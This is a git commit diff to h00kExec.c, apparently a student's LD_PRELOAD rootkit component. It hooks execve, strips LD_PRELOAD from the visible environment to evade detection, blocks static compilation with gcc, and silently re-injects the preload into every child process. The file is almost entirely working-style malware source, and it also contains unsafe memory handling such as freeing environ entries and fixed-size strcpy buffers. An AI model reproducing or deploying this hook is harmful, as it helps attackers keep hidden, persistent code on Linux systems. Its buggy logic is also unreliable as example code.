667a55e5c810287a6b1fdf7a04f475019339aa1a
root <root@rmb2555.student.rit.edu>
2017-03-22 21:55:33 -0400

    Fixed Bugs

--- h00k/h00kExec.c
+++ h00k/h00kExec.c
@@ -4,6 +4,7 @@
 *Hooks execve and breaks static compiling. So far has basic features
 *that will hide from detection methods
 *
+*gcc -o h00kExec.so -shared -fpic -ldl -Wl,-init,init h00kExec.c
 *
 */
 #include <stdlib.h>
@@ -11,6 +12,7 @@
 #include <unistd.h>
 #include <string.h>
 #include <dlfcn.h>
+#include <errno.h>
 
 //grabs the env variables at linking time(?)
 extern char **environ;
@@ -24,27 +26,29 @@ char *mypreload;
 void init(){
 	char ldvar[] = "LD_PRELOAD";
 
-	int ldlength = strlen(getenv(ldvar);
+	int ldlength = strlen(getenv(ldvar));
 	mypreload = malloc(ldlength + 1);
 	
 	//remove LD_PRELOAD from the enviorment variables
 	for(int i = 0; environ[i] != NULL; i++){
-		if(strstr(environ[i],ldvar)){
-			strcpy(environ[i],mypreload);
+	    if(strstr(environ[i],ldvar)){
+		strcpy(mypreload,environ[i]);
 
-			//this may not work *sigh* 
-			strcpy(environ[i], '\0');
-			free(environ[i]);
+		for(int j = 0; environ[i][j] != '\0'; j++){
+		   //this may not work *sigh*
+		   environ[i][j] = '\0';
 		}
-	}
-	
-}
+		free(environ[i]);
 
+	}
+    }
+ }
 int execve(const char *filename, char *const argv[], char *const envp[]){
 
 	char deflt[] = "LD_PRELOAD=";
 	char **newenvp;
-	int ldpos = 0;	
+	int ldpos = 0;
+	int x, y;
 
 	if(!old_execve){
 		old_execve = dlsym(RTLD_NEXT,"execve");		
@@ -54,27 +58,40 @@ int execve(const char *filename, char *const argv[], char *const envp[]){
 	if(strstr(filename, "gcc")){
 		for(int i =0; argv[i] != NULL; i++){
 			if(strstr(argv[i],"-static")){
-				errno = ETXBSY;
+				errno = EIO;
 				return -1;
 			}
 		}
 	}
 
 	//need to grab the size of the env vars
-	for(int x = 0; envp[x] != NULL; x++){
+	for(x = 0; envp[x] != NULL; x++){
 		if(strstr(envp[x], deflt)){
 			ldpos = x;
 		}
 	}
 
 	//lets load LD_PRELOAD back in :)
-	newenvp = (char**)malloc((x+1)*sizeof(char*));
+	newenvp = (char**)malloc((x+2)*sizeof(char*));
 
-	for(int y = 0;y < x; y++){
-		//load back LD_PRELOAD into the right spot
-		if(ldpos = 0){
-			//TODO		
+	if(ldpos == 0){
+		newenvp[x+1] = malloc(256);
+		strcpy(newenvp[x+1],mypreload);		
+	}else{
+	    newenvp[ldpos] = malloc(256);
+	    strcpy(newenvp[ldpos],mypreload);
+	}
+
+	for(y = 0;y < x; y++){
+		//wanky ass logic that sucks ass
+		if(ldpos != 0){
+		    if(y == ldpos) continue;
 		}
+
+		//load back LD_PRELOAD into the right spot
+		newenvp[y] = malloc(256);
+		strcpy(newenvp[y],envp[y]);
+
 	}
 
 	return old_execve(filename, argv, newenvp);
